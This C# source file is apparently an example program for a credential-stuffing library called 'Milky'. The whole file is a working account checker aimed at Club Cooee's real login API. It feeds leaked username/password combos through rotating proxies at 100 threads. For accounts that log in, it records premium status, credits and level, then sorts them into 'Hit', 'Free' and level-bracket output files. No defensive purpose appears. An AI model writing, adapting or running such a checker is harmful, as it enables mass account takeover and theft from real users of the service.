using Milky.Enums;
using Milky.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;

namespace Milky.Examples
{
    public static class Program
    {
        public static async Task Main()
        {
            var checkerSettings = new CheckerSettings(100, true);

            var checker = new CheckerBuilder(checkerSettings, CheckAsync)
                .WithCombos(File.ReadAllLines("Combos.txt"))
                .WithProxies(File.ReadAllLines("Proxies.txt"), new ProxySettings(ProxyProtocol.Http))
                .Build();

            var consoleManager = new ConsoleManager(checker);
            _ = consoleManager.StartUpdatingTitleAsync(TimeSpan.FromMilliseconds(25), prefix: "Club Cooee Checker — ");
            _ = consoleManager.StartListeningKeysAsync(ConsoleKey.P, ConsoleKey.R);

            await checker.StartAsync();

            await Task.Delay(-1);
        }

        private static async Task<CheckResult> CheckAsync(Combo combo, HttpClient httpClient, int attempts)
        {
            try
            {
                using var responseMessage = await httpClient.PostAsync("https://en.clubcooee.com/api3/auth_login", new FormUrlEncodedContent(new Dictionary<string, string>()
                {
                    { "username", combo.Username },
                    { "password", combo.Password }
                }));

                var responseString = await responseMessage.Content.ReadAsStringAsync();
                var responseJson = JsonSerializer.Deserialize<JsonElement>(responseString);

                if (responseJson.GetProperty("error").GetBoolean())
                {
                    return new CheckResult(ComboResult.Invalid);
                }

                JsonElement user = responseJson.GetProperty("msg").GetProperty("userdata").GetProperty("auth");

                bool vip = user.GetProperty("premium").GetBoolean();
                int level = user.GetProperty("xp_level").GetInt32();

                var captures = new Dictionary<string, object>()
                {
                    { "Username", user.GetProperty("name").GetString() },
                    { "VIP", vip },
                    { "Cash", user.GetProperty("credits").GetString() },
                    { "Level", level },
                    { "Verified", user.GetProperty("email_confirmed").GetBoolean() }
                };

                var outputFiles = new List<string>() { vip ? "Hit" : "Free" };

                if (level >= 10)
                {
                    outputFiles.Add(Path.Combine("Level", level switch
                    {
                        _ when level >= 100 => "100+",
                        _ when level >= 50 => "50-99",
                        _ => "10-49"
                    }));
                }

                return new CheckResult(vip ? ComboResult.Hit : ComboResult.Free, captures)
                {
                    OutputFiles = outputFiles
                };
            }
            catch
            {
                return new CheckResult(ComboResult.Retry, false);
            }
        }
    }
}
